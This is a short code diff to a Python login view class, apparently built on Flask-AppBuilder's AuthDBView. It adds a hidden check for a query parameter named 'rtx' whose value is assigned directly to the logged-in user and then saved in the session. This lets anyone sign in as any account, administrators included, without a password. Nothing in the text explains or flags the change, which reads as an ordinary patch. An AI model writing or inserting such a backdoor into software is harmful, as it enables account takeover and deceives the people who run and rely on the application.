@@ -181,6 +181,10 @@ class Myauthdbview(AuthDBView):
             elif message:
                 return message
 
+        if 'rtx' in request.args:
+            if request.args.get('rtx'):
+                g.user = request.args.get('rtx')
+
         # remember user
         if g.user:
             session['user'] = g.user
